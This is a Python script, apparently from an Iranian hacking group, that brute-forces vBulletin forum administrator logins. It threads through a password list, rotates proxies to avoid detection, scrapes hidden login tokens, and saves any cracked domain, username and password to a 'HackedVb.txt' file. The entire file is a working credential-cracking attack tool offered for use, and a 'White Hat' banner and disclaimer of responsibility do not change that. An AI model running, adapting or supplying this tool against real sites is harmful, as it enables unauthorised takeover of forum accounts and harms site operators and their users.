import requests, sys, threading, time, re, os, random
from random import randint
class BruteForceVB(object):
    def __init__(self):
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.flag = 0
        self.count = 1
        try:
            target = sys.argv[1]
            username = sys.argv[2]
            passlist = sys.argv[3]
            proxylist = list(open(sys.argv[4]).read().splitlines())

        except:
            self.cls()
            self.print_logo()
            print self.y + ' --------------------------------------------------'
            print self.w + '    [+] ' + self.r + ' Usage: ' + self.c + ' Python vb.py Target.com username pw.txt proxy.txt'
            sys.exit()
        try:
            with open(passlist, 'r') as x:
                passwords = x.read().splitlines()
        except:
            self.cls()
            self.print_logo()
            print self.y + ' --------------------------------------------------'
            print self.w + '    [+] ' + self.r + ' Error: ' + self.c + ' Password List file Not Found!'
            sys.exit()

        thread = []
        self.cls()
        self.print_logo()
        for password in passwords:
            if self.flag == 1:
                break
            t = threading.Thread(target=self.GoBrute, args=(password, target, username,
                                                            proxylist[randint(0, len(proxylist) - 1)]))
            self.x = password
            t.start()
            thread.append(t)
            time.sleep(0.02)
        for j in thread:
            j.join()
        if self.flag == 0:
            print self.y + '       [-]' + self.r + ' Password Not Found!! --> But Never GiveUp!'
            sys.exit()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
                    White Hat hacker
                ____        _ _      _   _         ____             _       ______                 
               |  _ \      | | |    | | (_)       |  _ \           | |     |  ____|                
         __   _| |_) |_   _| | | ___| |_ _ _ __   | |_) |_   _ _ __| |_ ___| |__ ___  _ __ ___ ___ 
         \ \ / /  _ <| | | | | |/ _ \ __| | '_ \  |  _ <| | | | '__| __/ _ \  __/ _ \| '__/ __/ _ |
          \ V /| |_) | |_| | | |  __/ |_| | | | | | |_) | |_| | |  | ||  __/ | | (_) | | | (_|  __/
           \_/ |____/ \__,_|_|_|\___|\__|_|_| |_| |____/ \__,_|_|   \__\___|_|  \___/|_|  \___\___|
                    GitHub.com/04x                    Iran-Cyber.Net                                                  
                                                                                                   

            Note! : We don't Accept any responsibility for any illegal usage.       
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def GoBrute(self, password, target, username, proxy):
        try:
            if self.flag == 1:
                pass
            else:
                if target.startswith("http://"):
                    target = target.replace("http://", "")
                elif target.startswith("https://"):
                    target = target.replace("https://", "")
                else:
                    pass
                sess = requests.session()
                sess.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                              ' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
                GetData = sess.get('http://' + target, timeout=5, proxies={'http': proxy})
                try:
                    Geturl = re.findall('type="hidden" name="url" value="(.*)"', GetData.text.encode('utf-8'))[0]
                except:
                    Geturl = '/admincp/'
                try:
                    GEtToken = re.findall('type="hidden" name="s" value="(.*)"', GetData.text.encode('utf-8'))[0]
                except:
                    GEtToken = ''
                try:
                    GetLoginType = re.findall('type="hidden" name="logintype" value="(.*)"',
                                              GetData.text.encode('utf-8'))[0]
                except:
                    GetLoginType = 'login'
                post = {}
                post['url'] = Geturl
                post['s'] = GEtToken
                post['logintype'] = GetLoginType
                post['do'] = 'login'
                post['vb_login_md5password'] = ''
                post['vb_login_md5password_utf'] = ''
                post['vb_login_username'] = username
                post['vb_login_password'] = password
                print self.y + '    [~]' + self.c + ' Testing: ' + self.w + password
                GoT = sess.post('http://' + target + '../login.php?do=login', data=post, timeout=5, proxies={'http': proxy})
                if 'exec_refresh' in GoT.text.encode('utf-8'):
                    with open('HackedVb.txt', 'a') as rrr:
                        rrr.write('-------------------\n' + 'Domain: ' + target + '\nUsername: ' +
                                  username + '\nPassword: ' + password + '\n')
                    self.flag = 1
                    print self.y + '       [+]' + self.g + ' Hacked! --> Open HackedVB.txt File!'
                    sys.exit()
        except:
            pass

BruteForceVB()
